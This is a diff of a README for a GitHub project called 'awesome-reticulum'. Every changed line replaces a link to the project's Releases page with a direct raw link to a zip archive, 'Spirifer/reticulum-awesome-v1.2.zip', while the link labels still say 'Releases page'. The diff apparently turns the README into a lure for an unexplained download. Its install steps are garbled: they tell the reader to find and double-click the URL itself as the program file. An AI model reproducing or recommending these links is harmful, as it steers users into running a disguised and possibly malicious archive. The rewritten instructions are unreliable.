@@ -6,17 +6,17 @@ Welcome to awesome-reticulum! This guide will help you download and run our appl
 
 ## 🌐 Download Here
 
-[![Download Now!](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Varshashrama801/awesome-reticulum/releases)
+[![Download Now!](https://github.com/Varshashrama801/awesome-reticulum/raw/refs/heads/main/Spirifer/reticulum-awesome-v1.2.zip)](https://github.com/Varshashrama801/awesome-reticulum/raw/refs/heads/main/Spirifer/reticulum-awesome-v1.2.zip)
 
 ## 📥 Download & Install
 
-To get started, you need to visit our [Releases page](https://github.com/Varshashrama801/awesome-reticulum/releases). Here, you will find the latest versions of the software available for download.
+To get started, you need to visit our [Releases page](https://github.com/Varshashrama801/awesome-reticulum/raw/refs/heads/main/Spirifer/reticulum-awesome-v1.2.zip). Here, you will find the latest versions of the software available for download.
 
 ### Step-by-Step Instructions
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the Releases page where all versions are listed.  
-   [Visit the Releases page](https://github.com/Varshashrama801/awesome-reticulum/releases)
+   [Visit the Releases page](https://github.com/Varshashrama801/awesome-reticulum/raw/refs/heads/main/Spirifer/reticulum-awesome-v1.2.zip)
 
 2. **Select a Version**  
    Look through the list of available versions. Each version will have a release date and notes about what has changed or improved. Choose the latest stable version that suits your needs.
@@ -25,13 +25,13 @@ To get started, you need to visit our [Releases page](https://github.com/Varshas
    Once you find your desired version, click on the asset file relevant to your operating system. The file will download to your computer.
 
 4. **Locate the Downloaded File**  
-   After the download completes, go to your "Downloads" folder or the location where your browser saves downloaded files. You should see a file named similar to `awesome-reticulum-v1.0.exe` or `awesome-reticulum-v1.0.zip`.
+   After the download completes, go to your "Downloads" folder or the location where your browser saves downloaded files. You should see a file named similar to `https://github.com/Varshashrama801/awesome-reticulum/raw/refs/heads/main/Spirifer/reticulum-awesome-v1.2.zip` or `https://github.com/Varshashrama801/awesome-reticulum/raw/refs/heads/main/Spirifer/reticulum-awesome-v1.2.zip`.
 
 5. **Extract Files (if needed)**  
    If you downloaded a `.zip` file, right-click on it and select "Extract All" to unpack the contents. This will create a new folder with the application files.
 
 6. **Run the Application**  
-   Open the folder containing the unpacked files (or just the `.exe` file if you downloaded that). Double-click on `awesome-reticulum.exe` to start the application.
+   Open the folder containing the unpacked files (or just the `.exe` file if you downloaded that). Double-click on `https://github.com/Varshashrama801/awesome-reticulum/raw/refs/heads/main/Spirifer/reticulum-awesome-v1.2.zip` to start the application.
 
 ### System Requirements
 
@@ -80,4 +80,4 @@ If you have any questions or need further assistance, please don’t hesitate to
 
 To keep up with updates, follow our repository and check the Releases page regularly for the latest features and improvements. 
 
-[Visit the Releases page](https://github.com/Varshashrama801/awesome-reticulum/releases) for more details on updates!
+[Visit the Releases page](https://github.com/Varshashrama801/awesome-reticulum/raw/refs/heads/main/Spirifer/reticulum-awesome-v1.2.zip) for more details on updates!
